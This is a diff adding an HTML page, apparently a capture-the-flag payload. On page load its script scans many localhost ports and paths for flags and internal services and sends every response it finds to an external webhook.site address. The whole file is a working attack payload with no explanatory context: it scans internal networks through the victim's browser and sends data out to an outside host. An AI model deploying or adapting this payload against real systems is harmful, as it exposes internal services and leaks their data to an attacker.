@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<script>
+const webhook = 'https://webhook.site/bc26ecde-2e1b-4b01-af18-8d14d15de90f/';
+
+// Check for internal services and flag locations
+function scanInternalServices() {
+    const ports = [80, 443, 1337, 1338, 1339, 3000, 5000, 8000, 8080, 8888, 9000];
+    const paths = ['/', '/flag', '/flag.txt', '/admin', '/secret', '/internal'];
+    
+    ports.forEach(port => {
+        paths.forEach(path => {
+            const url = `http://127.0.0.1:${port}${path}`;
+            
+            fetch(url)
+                .then(response => response.text())
+                .then(data => {
+                    if (data && data.includes('CTF{')) {
+                        fetch(webhook + '?INTERNAL_FLAG_FOUND=' + encodeURIComponent(data) + '&from=' + encodeURIComponent(url));
+                    } else if (data && data.trim().length > 0) {
+                        // Any successful response from internal service
+                        fetch(webhook + '?internal_service=' + encodeURIComponent(url) + '&response=' + encodeURIComponent(data.substring(0, 300)));
+                    }
+                })
+                .catch(() => {
+                    // Silent fail for most
+                });
+        });
+    });
+}
+
+// Also try the same service that we're on
+function checkSameService() {
+    const currentPort = 1338; // From the app.mjs
+    const paths = ['/flag', '/flag.txt', '/admin', '/internal', '/source', '/src'];
+    
+    paths.forEach(path => {
+        fetch(`http://127.0.0.1:${currentPort}${path}`)
+            .then(response => response.text())
+            .then(data => {
+                if (data && data.includes('CTF{')) {
+                    fetch(webhook + '?SAME_SERVICE_FLAG=' + encodeURIComponent(data) + '&path=' + path);
+                } else if (data && !data.includes('<form>')) {
+                    // Different from main page
+                    fetch(webhook + '?same_service_different=' + path + '&response=' + encodeURIComponent(data.substring(0, 200)));
+                }
+            })
+            .catch(() => {});
+    });
+}
+
+fetch(webhook + '?status=scanning_internal_services');
+scanInternalServices();
+checkSameService();
+</script>
+<body>
+<p>Internal service scanner</p>
+</body>
+</html>
